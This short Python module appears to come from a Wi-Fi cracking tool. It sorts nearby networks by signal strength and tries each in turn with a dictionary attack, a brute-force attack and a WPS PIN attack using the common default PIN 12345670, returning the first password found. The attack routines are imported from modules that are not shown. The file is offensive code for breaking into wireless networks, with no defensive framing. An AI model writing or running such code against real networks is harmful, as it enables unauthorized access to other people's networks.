# core/auto_connect.py
import subprocess
from core.dictionary_attack import dictionary_attack
from core.brute_force_attack import brute_force_attack
from core.wps_attack import wps_attack

def auto_connect(networks):
    if not networks:
        return "No networks found"

    networks.sort(key=lambda x: x['signal'], reverse=True)

    for network in networks:
        ssid = network['ssid']
        bssid = network['bssid']

        result = dictionary_attack(ssid, 'resources/dictionary.txt')
        if "Password found" in result:
            return result
            
        result = brute_force_attack(ssid)
        if "Password found" in result:
            return result

        result = wps_attack(bssid, '12345670')  # Пример PIN
        if "WPS PIN" in result:
            return result

    return "No networks connected"
